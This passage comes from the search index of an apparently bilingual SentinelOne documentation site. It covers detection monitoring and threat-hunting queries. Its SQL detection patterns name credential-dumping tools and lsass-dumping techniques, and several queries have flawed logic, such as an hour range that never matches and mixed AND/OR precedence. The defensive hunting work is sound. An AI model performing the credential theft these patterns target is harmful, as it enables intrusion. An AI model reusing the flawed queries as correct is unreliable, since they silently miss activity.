'medium'\n}\"\n</code></pre>"},{"location":"security/threat-detection/#detection-performance-monitoring","title":"\ud83d\udcca Detection Performance Monitoring","text":""},{"location":"security/threat-detection/#1-monitoring-detection-effectiveness","title":"1. Monitoring Detection Effectiveness","text":"<pre><code># Detection statistics\nsudo sentinelctl stats detection --period 24h\n\n# Output example:\nDetection Statistics (Last 24 hours):\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Detection Type     \u2502 Count   \u2502 True Pos.   \u2502 False Pos.   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Static Analysis    \u2502 1,247   \u2502 1,245       \u2502 2 (0.16%)    \u2502\n\u2502 Behavioral         \u2502 89      \u2502 85          \u2502 4 (4.49%)    \u2502\n\u2502 Machine Learning   \u2502 156     \u2502 152         \u2502 4 (2.56%)    \u2502\n\u2502 Heuristic         \u2502 234     \u2502 230         \u2502 4 (1.71%)    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nTotal Detections: 1,726\nOverall Accuracy: 98.2%\nFalse Positive Rate: 0.8%\n</code></pre>"},{"location":"security/threat-detection/#2-performance-impact-assessment","title":"2. Performance Impact Assessment","text":"<pre><code># Detection performance impact\nsudo sentinelctl performance detection\n\nDetection Performance Impact:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Metric              \u2502 Average     \u2502 Peak        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 CPU Usage           \u2502 3.2%        \u2502 8.1%        \u2502\n\u2502 Memory Usage        \u2502 245 MB      \u2502 312 MB      \u2502\n\u2502 Disk I/O            \u2502 2.1 MB/s    \u2502 15.8 MB/s   \u2502\n\u2502 Detection Latency   \u2502 1.2s        \u2502 3.8s        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"security/threat-detection/#threat-hunting-integration","title":"\ud83d\udd0d Threat Hunting Integration","text":""},{"location":"security/threat-detection/#1-custom-hunting-queries","title":"1. Custom Hunting Queries","text":"<pre><code>-- Deep Visibility Query Examples\n\n-- Detect suspicious process chains\nSELECT * FROM processes \nWHERE (cmdline LIKE '%powershell%' AND cmdline LIKE '%-enc%') \n   OR (cmdline LIKE '%wmic%' AND cmdline LIKE '%process%')\n   AND parent_name NOT IN ('explorer.exe', 'cmd.exe')\nORDER BY timestamp DESC\nLIMIT 100;\n\n-- Identify lateral movement attempts\nSELECT src_ip, dst_ip, dst_port, COUNT(*) as connection_count\nFROM network_connections \nWHERE dst_port IN (135, 139, 445, 3389)\n  AND src_ip != dst_ip\n  AND timestamp &gt; NOW() - INTERVAL '1 hour'\nGROUP BY src_ip, dst_ip, dst_port\nHAVING COUNT(*) &gt; 5\nORDER BY connection_count DESC;\n</code></pre>"},{"location":"security/threat-detection/#2-automated-threat-hunting-rules","title":"2. Automated Threat Hunting Rules","text":"<pre><code># Deploy custom hunting rules\nsudo sentinelctl hunting deploy --rule-file custom_hunting_rules.json\n\n# Schedule automated hunting\nsudo sentinelctl hunting schedule --rule \"lateral_movement_detection\" --interval \"1h\"\nsudo sentinelctl hunting schedule --rule \"credential_dumping\" --interval \"30m\"\n\n# View hunting results\nsudo sentinelctl hunting results --rule \"lateral_movement_detection\" --last 24h\n</code></pre>"},{"location":"security/threat-detection/#detection-optimization","title":"\ud83d\udcc8 Detection Optimization","text":""},{"location":"security/threat-detection/#1-false-positive-reduction","title":"1. False Positive Reduction","text":"<pre><code># Analyze false positives\nsudo sentinelctl analytics false-positives --period 7d\n\n# Add whitelist based on analysis\nsudo sentinelctl whitelist add --process \"legitimate_app.exe\" --reason \"Business application\"\nsudo sentinelctl whitelist add --hash \"sha256:abc123...\" --reason \"Signed company binary\"\n\n# Tune detection sensitivity based on environment\nsudo sentinelctl detection tune --environment production --target-fp-rate 0.1\n</code></pre>"},{"location":"security/threat-detection/#2-coverage-gap-analysis","title":"2. Coverage Gap Analysis","text":"<pre><code># Identify detection gaps\nsudo sentinelctl analytics gaps --assess-coverage\n\n# Coverage report example:\nDetection Coverage Assessment:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Attack Technique     \u2502 Coverage    \u2502 Confidence  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 T1055 Process Inj.   \u2502 95%         \u2502 High        \u2502\n\u2502 T1003 Credential     \u2502 89%         \u2502 High        \u2502\n\u2502 T1021 Remote Svc.    \u2502 78%         \u2502 Medium      \u2502\n\u2502 T1027 Obfuscation    \u2502 67%         \u2502 Medium      \u2502\n\u2502 T1090 Proxy          \u2502 45%         \u2502 Low         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nRecommendations:\n\u2022 Enable network monitoring for T1090 coverage\n\u2022 Deploy additional behavioral rules for T1027\n\u2022 Consider third-party integration for T1021\n</code></pre>"},{"location":"security/threat-detection/#validation-dan-testing","title":"\u2705 Validation dan Testing","text":""},{"location":"security/threat-detection/#1-detection-testing-dengan-mitre-attck","title":"1. Detection Testing dengan MITRE ATT&amp;CK","text":"<pre><code># Run MITRE ATT&amp;CK evaluation\nsudo sentinelctl test mitre --framework att&amp;ck --techniques T1055,T1003,T1021\n\n# Automated red team simulation\nsudo sentinelctl test redteam --scenario lateral_movement --duration 1h\n\n# Purple team exercises\nsudo sentinelctl test purple --playbook \"ransomware_simulation\"\n</code></pre>"},{"location":"security/threat-detection/#2-detection-validation-checklist","title":"2. Detection Validation Checklist","text":""},{"location":"security/threat-detection/#teknis-validation","title":"Teknis Validation","text":"<ul> <li>[ ] Static Detection: File signatures updated dan berfungsi</li> <li>[ ] Behavioral Detection: Anomaly detection sensitivity optimal</li> <li>[ ] Machine Learning: Model accuracy &gt; 95%</li> <li>[ ] Network Detection: Traffic analysis aktif</li> <li>[ ] False Positive Rate: &lt; 1% untuk environment production</li> </ul>"},{"location":"security/threat-detection/#operational-validation","title":"Operational Validation","text":"<ul> <li>[ ] Response Time: Alert response &lt; 5 minutes</li> <li>[ ] Coverage Assessment: MITRE ATT&amp;CK coverage &gt; 80%</li> <li>[ ] Integration Testing: SIEM forwarding berfungsi</li> <li>[ ] Performance Impact: CPU overhead &lt; 5%</li> <li>[ ] Threat Intelligence: IOC feeds terintegrasi</li> </ul>"},{"location":"security/threat-detection/#best-practices","title":"\ud83c\udfaf Best Practices","text":""},{"location":"security/threat-detection/#1-strategi-deteksi-yang-efektif","title":"1. Strategi Deteksi yang Efektif","text":"<p>Rekomendasi Konfigurasi</p> <ul> <li>Start Conservative: Mulai dengan sensitivity rendah, naikkan secara bertahap</li> <li>Monitor FP Rate: Target false positive rate &lt; 0.5% untuk production</li> <li>Regular Tuning: Review dan tune setiap bulan</li> <li>Test Before Deploy: Selalu test di lab environment dulu</li> <li>Document Changes: Catat semua perubahan konfigurasi</li> </ul>"},{"location":"security/threat-detection/#2-monitoring-dan-maintenance","title":"2. Monitoring dan Maintenance","text":"<p>Peringatan Penting</p> <ul> <li>Jangan disable detection tanpa approval keamanan</li> <li>Monitor performance impact setelah perubahan konfigurasi</li> <li>Backup configuration sebelum melakukan perubahan major</li> <li>Regular signature updates untuk detection effectiveness optimal</li> <li>Test disaster recovery untuk detection system</li> </ul>"},{"location":"security/threat-detection/#3-incident-response-integration","title":"3. Incident Response Integration","text":"<pre><code># Automated incident creation\nsudo sentinelctl integration incident --system servicenow --config \"\n{\n    'endpoint': 'https://company.service-now.com/api',\n    'username': 'sentinelone_integration',\n    'severity_mapping': {\n        'critical': 'P1',\n        'high': 'P2',\n        'medium': 'P3',\n        'low': 'P4'\n    },\n    'auto_assign': true\n}\"\n</code></pre>"},{"location":"security/threat-detection/#troubleshooting","title":"\ud83d\udd27 Troubleshooting","text":""},{"location":"security/threat-detection/#common-detection-issues","title":"Common Detection Issues","text":"Masalah Penyebab Solusi High False Positives Sensitivity terlalu tinggi Turunkan threshold, tambah exclusions Missed Detections Sensitivity terlalu rendah Naikkan sensitivity, update signatures Performance Impact Detection overhead tinggi Optimize rules, disable unused features Detection Delay Processing queue backup Check system resources, tune thresholds"},{"location":"security/threat-detection/#diagnostic-commands","title":"Diagnostic Commands","text":"<pre><code># Detection engine status\nsudo sentinelctl diagnostics detection\n\n# Performance analysis\nsudo sentinelctl diagnostics performance --focus detection\n\n# Rule effectiveness analysis\nsudo sentinelctl diagnostics rules --analyze-effectiveness\n</code></pre> <p>Untuk bantuan lebih lanjut dengan konfigurasi deteksi, hubungi Security Team atau rujuk ke SentinelOne Knowledge Base.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"security/threat-hunting/","title":"Teknik Threat Hunting di SentinelOne","text":"<p>Panduan lengkap untuk melakukan threat hunting proaktif menggunakan SentinelOne EDR untuk mendeteksi ancaman tersembunyi dan meningkatkan postur keamanan organisasi.</p>"},{"location":"security/threat-hunting/#threat-hunting-methodology","title":"\ud83c\udfaf Threat Hunting Methodology","text":"<pre><code>flowchart TD\n    subgraph \"Threat Hunting Process\"\n        INTEL[\"Threat Intelligence&lt;br/&gt;IOCs, TTPs, Campaigns\"]\n        HYPOTHESIS[\"Hypothesis Formation&lt;br/&gt;What to Hunt For\"]\n        COLLECT[\"Data Collection&lt;br/&gt;Telemetry &amp; Logs\"]\n        ANALYZE[\"Analysis &amp; Investigation&lt;br/&gt;Pattern Recognition\"]\n        VALIDATE[\"Validation&lt;br/&gt;Confirm True Positives\"]\n        RESPONSE[\"Response &amp; Mitigation&lt;br/&gt;Containment Actions\"]\n    end\n\n    subgraph \"Data Sources\"\n        ENDPOINT[\"Endpoint Telemetry&lt;br/&gt;Process, File, Registry\"]\n        NETWORK[\"Network Data&lt;br/&gt;DNS, HTTP, TLS\"]\n        USER[\"User Behavior&lt;br/&gt;Authentication, Access\"]\n        EXTERNAL[\"External Intelligence&lt;br/&gt;Feeds, Reports\"]\n    end\n\n    subgraph \"Hunting Techniques\"\n        BASELINE[\"Baseline Deviation&lt;br/&gt;Anomaly Detection\"]\n        INDICATORS[\"IOC Matching&lt;br/&gt;Known Bad Patterns\"]\n        BEHAVIOR[\"Behavioral Analysis&lt;br/&gt;TTP Detection\"]\n        CORRELATION[\"Event Correlation&lt;br/&gt;Timeline Analysis\"]\n    end\n\n    INTEL --&gt; HYPOTHESIS\n    HYPOTHESIS --&gt; COLLECT\n    COLLECT --&gt; ANALYZE\n    ANALYZE --&gt; VALIDATE\n    VALIDATE --&gt; RESPONSE\n\n    ENDPOINT --&gt; COLLECT\n    NETWORK --&gt; COLLECT\n    USER --&gt; COLLECT\n    EXTERNAL --&gt; INTEL\n\n    BASELINE --&gt; ANALYZE\n    INDICATORS --&gt; ANALYZE\n    BEHAVIOR --&gt; ANALYZE\n    CORRELATION --&gt; ANALYZE\n\n    style INTEL fill:#e3f2fd\n    style ANALYZE fill:#e8f5e8\n    style RESPONSE fill:#fff3e0</code></pre>"},{"location":"security/threat-hunting/#deep-visibility-query-interface","title":"\ud83d\udd0d Deep Visibility Query Interface","text":""},{"location":"security/threat-hunting/#1-accessing-sentinelone-deep-visibility","title":"1. Accessing SentinelOne Deep Visibility","text":"<pre><code>Management Console Navigation:\nConsole &gt; Visibility &gt; Deep Visibility &gt; Query Builder\n</code></pre> <p>Alternatif melalui sentinelctl: <pre><code># Access query interface via CLI\nsudo sentinelctl query --interface deep-visibility\n\n# Run saved queries\nsudo sentinelctl query --run \"lateral_movement_hunt\"\n\n# Export query results\nsudo sentinelctl query --run \"suspicious_processes\" --export csv\n</code></pre></p>"},{"location":"security/threat-hunting/#2-query-syntax-dan-structure","title":"2. Query Syntax dan Structure","text":""},{"location":"security/threat-hunting/#basic-query-structure","title":"Basic Query Structure","text":"<pre><code>-- Basic SELECT query\nSELECT column1, column2, column3\nFROM table_name\nWHERE condition\nORDER BY column ASC/DESC\nLIMIT number;\n\n-- Time-based filtering\nSELECT *\nFROM processes\nWHERE createdAt BETWEEN '2024-01-01' AND '2024-01-07'\nORDER BY createdAt DESC;\n</code></pre>"},{"location":"security/threat-hunting/#available-data-tables","title":"Available Data Tables","text":"Table Description Key Fields processes Process execution data <code>processName</code>, <code>cmdLine</code>, <code>parentName</code>, <code>user</code> network Network connections <code>srcIp</code>, <code>dstIp</code>, <code>dstPort</code>, <code>direction</code> files File operations <code>filePath</code>, <code>fileType</code>, <code>action</code>, <code>hash</code> registry Registry modifications <code>registryPath</code>, <code>registryKey</code>, <code>action</code> dns DNS queries <code>dnsRequest</code>, <code>dnsResponse</code>, <code>queryType</code> events Security events <code>eventType</code>, <code>description</code>, <code>severity</code>"},{"location":"security/threat-hunting/#threat-hunting-scenarios","title":"\ud83d\udd75\ufe0f Threat Hunting Scenarios","text":""},{"location":"security/threat-hunting/#scenario-1-hunting-for-lateral-movement","title":"Scenario 1: Hunting for Lateral Movement","text":""},{"location":"security/threat-hunting/#11-suspicious-remote-connections","title":"1.1 Suspicious Remote Connections","text":"<pre><code>-- Detect potential lateral movement via RDP/SMB\nSELECT \n    srcIp,\n    dstIp,\n    dstPort,\n    COUNT(*) as connection_count,\n    MIN(createdAt) as first_seen,\n    MAX(createdAt) as last_seen\nFROM network\nWHERE \n    dstPort IN (445, 3389, 135, 139)\n    AND direction = 'OUTGOING'\n    AND createdAt &gt; '2024-01-01'\nGROUP BY srcIp, dstIp, dstPort\nHAVING COUNT(*) &gt; 5\nORDER BY connection_count DESC\nLIMIT 50;\n</code></pre>"},{"location":"security/threat-hunting/#12-credential-access-patterns","title":"1.2 Credential Access Patterns","text":"<pre><code>-- Hunt for credential dumping activities\nSELECT \n    processName,\n    cmdLine,\n    parentName,\n    user,\n    createdAt,\n    endpointName\nFROM processes\nWHERE (\n    (processName = 'rundll32.exe' AND cmdLine LIKE '%comsvcs%MiniDump%')\n    OR (processName = 'tasklist.exe' AND cmdLine LIKE '%lsass%')\n    OR (cmdLine LIKE '%sekurlsa%')\n    OR (cmdLine LIKE '%mimikatz%')\n    OR (filePath LIKE '%procdump%' AND cmdLine LIKE '%lsass%')\n)\nAND createdAt &gt; '2024-01-01'\nORDER BY createdAt DESC;\n</code></pre>"},{"location":"security/threat-hunting/#13-anomalous-administrative-activity","title":"1.3 Anomalous Administrative Activity","text":"<pre><code>-- Detect unusual administrative tool usage\nSELECT \n    user,\n    processName,\n    cmdLine,\n    parentName,\n    COUNT(*) as execution_count,\n    COUNT(DISTINCT endpointName) as endpoint_count\nFROM processes\nWHERE (\n    processName IN ('psexec.exe', 'wmic.exe', 'net.exe', 'schtasks.exe')\n    OR cmdLine LIKE '%powershell%Invoke-Command%'\n    OR cmdLine LIKE '%wmic%process%'\n)\nAND user NOT LIKE '%SYSTEM%'\nAND createdAt &gt; '2024-01-01'\nGROUP BY user, processName\nHAVING COUNT(*) &gt; 10 OR COUNT(DISTINCT endpointName) &gt; 3\nORDER BY execution_count DESC;\n</code></pre>"},{"location":"security/threat-hunting/#scenario-2-hunting-for-persistence-mechanisms","title":"Scenario 2: Hunting for Persistence Mechanisms","text":""},{"location":"security/threat-hunting/#21-registry-based-persistence","title":"2.1 Registry-based Persistence","text":"<pre><code>-- Hunt for registry persistence modifications\nSELECT \n    registryPath,\n    registryKey,\n    registryValue,\n    processName,\n    user,\n    endpointName,\n    createdAt\nFROM registry\nWHERE (\n    registryPath LIKE '%\\\\CurrentVersion\\\\Run%'\n    OR registryPath LIKE '%\\\\CurrentVersion\\\\RunOnce%'\n    OR registryPath LIKE '%\\\\Winlogon%'\n    OR registryPath LIKE '%\\\\Image File Execution Options%'\n    OR registryPath LIKE '%\\\\Services%'\n)\nAND action = 'Modified'\nAND createdAt &gt; '2024-01-01'\nORDER BY createdAt DESC;\n</code></pre>"},{"location":"security/threat-hunting/#22-scheduled-task-persistence","title":"2.2 Scheduled Task Persistence","text":"<pre><code>-- Detect suspicious scheduled tasks\nSELECT \n    processName,\n    cmdLine,\n    user,\n    parentName,\n    endpointName,\n    createdAt\nFROM processes\nWHERE (\n    (processName = 'schtasks.exe' AND cmdLine LIKE '%create%')\n    OR (processName = 'at.exe')\n    OR (cmdLine LIKE '%Register-ScheduledTask%')\n)\nAND user NOT LIKE '%SYSTEM%'\nAND createdAt &gt; '2024-01-01'\nORDER BY createdAt DESC;\n</code></pre>"},{"location":"security/threat-hunting/#23-service-based-persistence","title":"2.3 Service-based Persistence","text":"<pre><code>-- Hunt for suspicious service installations\nSELECT \n    processName,\n    cmdLine,\n    user,\n    parentName,\n    endpointName,\n    createdAt\nFROM processes\nWHERE (\n    (processName = 'sc.exe' AND cmdLine LIKE '%create%')\n    OR (cmdLine LIKE '%New-Service%')\n    OR (processName = 'net.exe' AND cmdLine LIKE '%service%')\n)\nAND createdAt &gt; '2024-01-01'\nORDER BY createdAt DESC;\n</code></pre>"},{"location":"security/threat-hunting/#scenario-3-hunting-for-data-exfiltration","title":"Scenario 3: Hunting for Data Exfiltration","text":""},{"location":"security/threat-hunting/#31-large-data-transfers","title":"3.1 Large Data Transfers","text":"<pre><code>-- Detect potential data exfiltration\nSELECT \n    srcIp,\n    dstIp,\n    dstPort,\n    processName,\n    SUM(bytesOut) as total_bytes_out,\n    COUNT(*) as connection_count,\n    endpointName\nFROM network\nWHERE \n    direction = 'OUTGOING'\n    AND dstIp NOT LIKE '10.%'\n    AND dstIp NOT LIKE '192.168.%'\n    AND dstIp NOT LIKE '172.%'\n    AND createdAt &gt; '2024-01-01'\nGROUP BY srcIp, dstIp, processName, endpointName\nHAVING SUM(bytesOut) &gt; 100000000  -- &gt; 100MB\nORDER BY total_bytes_out DESC;\n</code></pre>"},{"location":"security/threat-hunting/#32-suspicious-file-operations","title":"3.2 Suspicious File Operations","text":"<pre><code>-- Hunt for potential data staging\nSELECT \n    filePath,\n    processName,\n    action,\n    user,\n    fileSize,\n    endpointName,\n    createdAt\nFROM files\nWHERE (\n    (filePath LIKE '%.zip%' OR filePath LIKE '%.rar%' OR filePath LIKE '%.7z%')\n    AND fileSize &gt; 50000000  -- &gt; 50MB\n)\nOR (\n    filePath LIKE '%temp%' \n    AND fileSize &gt; 100000000  -- &gt; 100MB\n    AND action = 'Created'\n)\nAND createdAt &gt; '2024-01-01'\nORDER BY fileSize DESC;\n</code></pre>"},{"location":"security/threat-hunting/#advanced-hunting-techniques","title":"\ud83d\udcca Advanced Hunting Techniques","text":""},{"location":"security/threat-hunting/#1-behavioral-pattern-analysis","title":"1. Behavioral Pattern Analysis","text":""},{"location":"security/threat-hunting/#process-chain-analysis","title":"Process Chain Analysis","text":"<pre><code>-- Analyze suspicious process execution chains\nWITH ProcessChain AS (\n    SELECT \n        p1.processName as parent_process,\n        p2.processName as child_process,\n        p3.processName as grandchild_process,\n        p1.cmdLine as parent_cmd,\n        p2.cmdLine as child_cmd,\n        p3.cmdLine as grandchild_cmd,\n        p1.createdAt,\n        p1.endpointName\n    FROM processes p1\n    JOIN processes p2 ON p1.processUuid = p2.parentProcessUuid\n    LEFT JOIN processes p3 ON p2.processUuid = p3.parentProcessUuid\n    WHERE p1.createdAt &gt; '2024-01-01'\n)\nSELECT *\nFROM ProcessChain\nWHERE (\n    parent_process = 'winword.exe' AND child_process = 'powershell.exe'\n    OR parent_process = 'excel.exe' AND child_process = 'cmd.exe'\n    OR parent_process = 'outlook.exe' AND child_process = 'wscript.exe'\n    OR (child_process = 'powershell.exe' AND grandchild_process = 'rundll32.exe')\n)\nORDER BY createdAt DESC;\n</code></pre>"},{"location":"security/threat-hunting/#time-based-anomaly-detection","title":"Time-based Anomaly Detection","text":"<pre><code>-- Detect processes running at unusual times\nSELECT \n    processName,\n    COUNT(*) as execution_count,\n    EXTRACT(HOUR FROM createdAt) as execution_hour,\n    EXTRACT(DOW FROM createdAt) as day_of_week,\n    endpointName\nFROM processes\nWHERE \n    createdAt &gt; '2024-01-01'\n    AND processName IN ('powershell.exe', 'cmd.exe', 'wscript.exe', 'cscript.exe')\nGROUP BY processName, EXTRACT(HOUR FROM createdAt), EXTRACT(DOW FROM createdAt), endpointName\nHAVING (\n    (EXTRACT(HOUR FROM createdAt) BETWEEN 22 AND 6)  -- Night time\n    OR EXTRACT(DOW FROM createdAt) IN (0, 6)         -- Weekend\n)\nAND COUNT(*) &gt; 5\nORDER BY execution_count DESC;\n</code></pre>"},{"location":"security/threat-hunting/#2-statistical-analysis","title":"2. Statistical Analysis","text":""},{"location":"security/threat-hunting/#frequency-analysis","title":"Frequency Analysis","text":"<pre><code>-- Identify rare but suspicious processes\nWITH ProcessFrequency AS (\n    SELECT \n        processName,\n        COUNT(*) as total_executions,\n        COUNT(DISTINCT endpointName) as endpoint_count,\n        COUNT(DISTINCT user) as user_count\n    FROM processes\n    WHERE createdAt &gt; '2024-01-01'\n    GROUP BY processName\n)\nSELECT \n    pf.processName,\n    pf.total_executions,\n    pf.endpoint_count,\n    pf.user_count,\n    p.cmdLine,\n    p.filePath,\n    p.user,\n    p.endpointName,\n    p.createdAt\nFROM ProcessFrequency pf\nJOIN processes p ON pf.processName = p.processName\nWHERE \n    pf.total_executions BETWEEN 1 AND 10  -- Rare processes\n    AND pf.endpoint_count = 1              -- Only on one endpoint\n    AND p.createdAt &gt; '2024-01-01'\n    AND p.processName NOT LIKE '%.tmp%'\n    AND p.filePath NOT LIKE '%\\\\Windows\\\\%'\nORDER BY pf.total_executions ASC;\n</code></pre>"},{"location":"security/threat-hunting/#custom-hunting-rules","title":"\ud83c\udfa8 Custom Hunting Rules","text":""},{"location":"security/threat-hunting/#1-creating-custom-hunting-rules","title":"1. Creating Custom Hunting Rules","text":""},{"location":"security/threat-hunting/#rule-template-structure","title":"Rule Template Structure","text":"<pre><code>{\n    \"rule_name\": \"Custom_Hunting_Rule\",\n    \"description\": \"Description of what this rule hunts for\",\n    \"author\": \"Security Team\",\n    \"severity\": \"medium\",\n    \"query\": {\n        \"sql\": \"SELECT * FROM table WHERE condition\",\n        \"timeframe\": \"24h\"\n    },\n    \"schedule\": {\n        \"frequency\": \"1h\",\n        \"enabled\": true\n    },\n    \"actions\": {\n        \"alert\": true,\n        \"notify_email\": [\"security@company.com\"],\n        \"create_incident\": false\n    }\n}\n</code></pre>"},{"location":"security/threat-hunting/#example-lateral-movement-detection-rule","title":"Example: Lateral Movement Detection Rule","text":"<pre><code>{\n    \"rule_name\": \"Lateral_Movement_Hunt\",\n    \"description\": \"Detects potential lateral movement via administrative tools\",\n    \"author\": \"SOC Team\",\n    \"severity\": \"high\",\n    \"query\": {\n        \"sql\": \"SELECT user, processName, cmdLine, endpointName, createdAt FROM processes WHERE (processName IN ('psexec.exe', 'wmic.exe') OR cmdLine LIKE '%powershell%Invoke-Command%') AND user NOT LIKE '%SYSTEM%' AND createdAt &gt; NOW() - INTERVAL '1 hour'\",\n        \"timeframe\": \"1h\"\n    },\n    \"schedule\": {\n        \"frequency\": \"15m\",\n        \"enabled\": true\n    },\n    \"actions\": {\n        \"alert\": true,\n        \"notify_email\": [\"soc@company.com\"],\n        \"create_incident\": true\n    }\n}\n</code></pre>"},{"location":"security/threat-hunting/#2-deploying-custom-rules-via-sentinelctl","title":"2. Deploying Custom Rules via sentinelctl","text":"<pre><code># Deploy custom hunting rule\nsudo sentinelctl hunting rule deploy --file lateral_movement_hunt.json\n\n# List active hunting rules\nsudo sentinelctl hunting rule list\n\n# Enable/disable hunting rule\nsudo sentinelctl hunting rule enable --name \"Lateral_Movement_Hunt\"\nsudo sentinelctl hunting rule disable --name \"Lateral_Movement_Hunt\"\n\n# View rule execution results\nsudo sentinelctl hunting rule results --name \"Lateral_Movement_Hunt\" --last 24h\n</code></pre>"},{"location":"security/threat-hunting/#hunting-campaign-management","title":"\ud83d\udcc8 Hunting Campaign Management","text":""},{"location":"security/threat-hunting/#1-structured-hunting-campaigns","title":"1. Structured Hunting Campaigns","text":""},{"location":"security/threat-hunting/#campaign-planning-template","title":"Campaign Planning Template","text":"<pre><code>campaign_name: \"APT_Hunting_Campaign_Q1_2024\"\ndescription: \"Hunt for APT techniques based on recent threat intelligence\"\nstart_date: \"2024-01-01\"\nend_date: \"2024-03-31\"\n\nobjectives:\n  - Hunt for lateral movement techniques\n  - Identify persistence mechanisms\n  - Detect data exfiltration attempts\n  - Validate detection coverage\n\nhypotheses:\n  - Adversaries are using WMI for lateral movement\n  - Persistence is established via scheduled tasks\n  - Data is staged in temp directories before exfiltration\n\nqueries:\n  - lateral_movement_wmi.sql\n  - persistence_schtasks.sql\n  - data_staging_temp.sql\n\nschedule:\n  daily_hunts: [\"lateral_movement_wmi\", \"persistence_schtasks\"]\n  weekly_hunts: [\"data_staging_temp\"]\n  ad_hoc_hunts: [\"custom_ioc_search\"]\n\nreporting:\n  frequency: \"weekly\"\n  stakeholders: [\"CISO\", \"SOC Manager\", \"Incident Response\"]\n  format: \"executive_summary\"\n</code></pre>"},{"location":"security/threat-hunting/#campaign-execution-commands","title":"Campaign Execution Commands","text":"<pre><code># Initialize hunting campaign\nsudo sentinelctl hunting campaign create --config apt_hunting_q1.yaml\n\n# Execute campaign hunts\nsudo sentinelctl hunting campaign run --name \"APT_Hunting_Campaign_Q1_2024\"\n\n# Generate campaign report\nsudo sentinelctl hunting campaign report --name \"APT_Hunting_Campaign_Q1_2024\" --format pdf\n\n# Export campaign results\nsudo sentinelctl hunting campaign export --name \"APT_Hunting_Campaign_Q1_2024\" --format json\n</code></pre>"},{"location":"security/threat-hunting/#2-threat-intelligence-integration","title":"2. Threat Intelligence Integration","text":""},{"location":"security/threat-hunting/#ioc-based-hunting","title":"IOC-based Hunting","text":"<pre><code># Import threat intelligence IOCs\nsudo sentinelctl threat-intel import --feed misp --url https://misp.company.com/feeds\nsudo sentinelctl threat-intel import --file apt_iocs.json\n\n# Run IOC hunting across endpoints\nsudo sentinelctl hunting ioc-search --indicators-file latest_iocs.txt\n\n# Automated IOC hunting\nsudo sentinelctl hunting schedule --type ioc-match --interval 4h --feed misp\n</code></pre>"},{"location":"security/threat-hunting/#yara-rule-integration","title":"YARA Rule Integration","text":"<pre><code># Deploy YARA rules for hunting\nsudo sentinelctl hunting yara deploy --rule-file custom_hunt_rules.yar\n\n# Run YARA-based memory hunting\nsudo sentinelctl hunting yara scan --target memory --rule-name \"apt_memory_hunt\"\n\n# Scheduled YARA hunts\nsudo sentinelctl hunting schedule --type yara --rule-name \"malware_hunt\" --interval 